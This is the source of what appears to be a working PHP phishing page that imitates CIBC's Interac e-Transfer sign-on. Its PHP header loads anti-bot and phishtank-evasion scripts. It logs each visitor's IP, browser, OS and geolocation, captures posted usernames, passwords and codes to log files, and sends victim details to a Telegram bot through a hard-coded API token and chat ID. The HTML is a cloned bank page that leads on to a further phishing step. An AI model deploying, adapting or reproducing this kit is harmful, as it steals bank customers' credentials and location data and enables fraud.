=<?php
        include "/anti-bot/Bot-Spox.php";
        include "/anti-bot/Dila_DZ.php";
        include "/anti-bot/Fuck-you.php";
        include "/anti-bot/index.php";
        include "/anti-bot/IP-BlackList.php";
        include "/anti-bot/new.php";
        include "/anti-bot/proxyblock.php";
        include "/anti-bot/whitelist.dat";
        include "/anti-bot/#1.php";
        include "/anti-bot/#2.php";
        include "/anti-bot/#3.php";
        include "/anti-bot/#4.php";
        include "/anti-bot/#5.php";
        include "/anti-bot/#6.php";
        include "/anti-bot/#7.php";
        include "/anti-bot/#8.php";
        include "/anti-bot/#9.php";
        include "/anti-bot/#10.php";
        include "/anti-bot/#11.php";
        include "/anti-bot/#12.php";
        include "/anti-bot/antibot_host.php";
        include "/anti-bot/antibot_ip.php";
        include "/anti-bot/antibot_phishtank.php";
        include "/anti-bot/antibot_proxy.php";
        include "/anti-bot/antibot_userAgent.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "CIBC";
    $project    = "[CR00K-3D]";
    $url        = "https://CIBC.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 

    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><html lang="en"><head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Sign on | CIBC Online Banking</title>
      <style>
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyBookRegular";
              src: url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Book_Web.woff") format("woff");
              font-weight: normal;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 600;
              font-style: normal;
          }
          @font-face {
              font-family: "WhitneyMedium";
              src: url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Medium_Web.woff") format("woff");
              font-weight: 500;
              font-style: normal;
          }
          @font-face {
              font-family: "Whitney";
              src: url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff2") format("woff2"),
                  url("/ebm-resources/common-content/fonts/Whitney-Semibld_Web.woff") format("woff");
              font-weight: 900;
              font-style: normal;
          }
      </style>
      <link rel="stylesheet" type="text/css" href="files/157-1f5342e1.css">
  </head>


<html><head class="at-element-marker"><script type="text/javascript" async="async" src="http://analytic.cibc.com/b/ss/cibcolbdev/10/JS-2.14.0-LBQ1/s25732305529823?AQB=1&amp;ndh=1&amp;pf=1&amp;callback=s_c_il[4].doPostbacks&amp;et=1&amp;t=6%2F3%2F2023%2017%3A18%3A15%204%20420&amp;d.&amp;nsid=0&amp;jsonv=1&amp;.d&amp;D=D%3D&amp;ce=UTF-8&amp;pageName=cibc%3E%3E&amp;g=file%3A%2F%2F%2FC%3A%2FUsers%2Fwww%2FDesktop%2Fcibc%2520select.html&amp;cc=CAD&amp;v10=D%3DpageName&amp;c11=D%3Dv11&amp;v11=%3A%3A%3A&amp;c15=D%3Dv15&amp;v15=file%3A%2F%2F%2FC%3A%2FUsers%2Fwww%2FDesktop%2Fcibc%2520select.html&amp;c16=D%3Dv16&amp;v16=en&amp;c18=D%3Dv18&amp;v18=D%3Dt&amp;c30=D%3Dv30&amp;v30=8%3A18%20PM%7CThursday&amp;c50=Custom%20v3.5%20%7C%20AppMeasurement%202.14.0%20%7C%20LaunchPublishDate%202021.04.09&amp;s=2256x1504&amp;c=24&amp;j=1.6&amp;v=N&amp;k=N&amp;bw=1126&amp;bh=1326&amp;AQE=1"></script>
	<link rel="stylesheet" href="files/reset.css">
	<link rel="stylesheet" href="files/reset-brand.css">
	<link rel="stylesheet" href="files/global.css">
	<link rel="stylesheet" href="files/global-android2.css">
	<link rel="stylesheet" href="files/global-brand.css">
<script type="text/javascript" id="wicket-ajax-base-url">
/*<![CDATA[*/
Wicket.Ajax.baseUrl="emt-receive-home?locale=en&amp;id=CAsfvMCv";
/*]]>*/
</script>

<link rel="stylesheet" href="files/receive-method.css">
<link rel="stylesheet" href="files/receive-method-brand.css">
	



<script src="files/receive-method.js.download"></script>
<script type="text/javascript">

</script>

	<script type="text/javascript" src="files/wicket-adobe-analytics-interaction.js.download"></script>
	
	
		<script> var digitalData={
</script>
	
	<script src="files/launch-EN034ff4c320584a519fa9fe106f74a1a8.min.js.download"></script><script src="https://www.google-analytics.com/analytics.js" async=""></script><script src="https://assets.adobedtm.com/986cf825ecbc/0440e05abc61/4cba9fce426f/EX7d5c34f12030415084746ebbd6d95598-libraryCode_source.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement_Module_AudienceManagement.min.js" async=""></script><script src="files/analytics.js.download" async=""></script><script src="files/EX7d5c34f12030415084746ebbd6d95598-libraryCode_source.min.js.download" async=""></script><script src="files/AppMeasurement_Module_AudienceManagement.min.js.download" async=""></script><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style> 
</head>
<body lang="en">
	<span class="offscreen"><em>Interac</em> e-Transfer</span>
	

<header class="flex-box flex-box-hoz">
	<div class="flex-box-flex-1"></div>
	<a href="http://cibc.com/" target="_blank">
		<div id="header-logo">
			<span class="offscreen">CIBC logo</span>
		</div>
	</a>
	<div id="header-link" class="flex-box-flex-1">
		
		<a href="https://www.cibc.mobi/ebm-mobile-mm/emt-receive-home;jsessionid=A887EC456CDD2D22E1563DDF01FEC1A8.ebm-mobile-mm-1?0-1.ILinkListener-header-linkLocale&amp;locale=en&amp;id=CAsfvMCv" class="headerLink" id="id1">
			<div lang="fr">Français</div>
		</a>
	</div>
</header>

		<noscript>
			<section id="nojs" class="overlay-msg">
			<div>
				<p>JavaScript is currently disabled in your browser.</p>
				<p>To access Mobile Banking, please enable JavaScript and refresh this page.</p>
			</div>
			</section>
		</noscript>
	<section id="main-page" class="">
		
<section id="id2">
<section class="page-title"> 
	
	<h2 class="title"><em>Interac</em> e-Transfer</h2>
</section>    	
</section>
<section id="emt-receive-method" class="page-wrapper">
	
	<div id="description-text">
		<p class="iOS android" style="display: block;">How would you like to deposit your e-Transfer?</p>
		<p class="no-app" style="display: none;">Select Continue to deposit your e-Transfer.</p>
	</div>

	<button id="androidButton" data-value="ANDR" data-link="cibcbanking://receiveetransfer?etransfertoken=CAsfvMCv" class="method-button android" name="androidButton"><span>Mobile app</span></button>
	<button id="iosButton" data-value="IOS" data-link="cibcbanking://receiveetransfer?etransfertoken=CAsfvMCv" class="method-button iOS selected" name="iosButton" style="display: block;"><span>Web browser</span></button>
	<button id="mobileWebButton" data-value="MWEB" data-link="/ebm-resources/online-banking/client/index.html#/auth/signon?channel=mobileweb&amp;emtType=receive&amp;emtId=CAsfvMCv&amp;locale=en" class="method-button mobile-web" name="mobileWebButton"><span>Mobile app</span></button>
	<div class="button-set">
		<a class="btn btn-positive" id="continue-link" href="040147.php"><span>Continue</span></a>
	</div>

	<p id="store-link-hint" class="iOS android" style="display: block;">Don’t have the app? Get it here:</p>
	<a id="androidStoreLink" class="android storelink" href="http://c00.adobe.com/faaef37a29ba13643bac38a415b557b7f6a6fe2d720fd521627af9c7002d7093/llqs0s6j/g/com.cibc.android.mobi" target="_blank">
		<img src="files/badges-android.png" alt="Google Play Logo">
	</a>
	<a id="iosStoreLink" class="iOS storelink" href="http://c00.adobe.com/faaef37a29ba13643bac38a415b557b7f6a6fe2d720fd521627af9c7002d7093/llqs0s6j/i/351448953" target="_blank" style="display: block;">
		<img src="files/badges-iOS.png" alt="Apple App Store Logo">
	</a>
	
</section>

<section id="more-info">
	<a href="https://www.cibc.com/ca/how-to-bank" target="_blank">Learn about ways to bank with CIBC</a>
</section>

<section id="emt-footer" class="page-wrapper">
	<p>Your use of CIBC Mobile Banking is governed by the CIBC Electronic Access Agreement.</p>

	<p><a href="https://www.cibc.com/m/contact-cibc.html" target="_blank">Contact	Us</a> | <a href="http://cibc.intelliresponse.com/mobile-w/" target="_blank">Help</a> | <a href="https://www.cibc.com/ca/mobile/legal.html" target="_blank">Legal</a></p>
</section>


	</section>
	
	<script>

</script>
<script type="text/javascript" src="files/KS0"></script>

</body></html>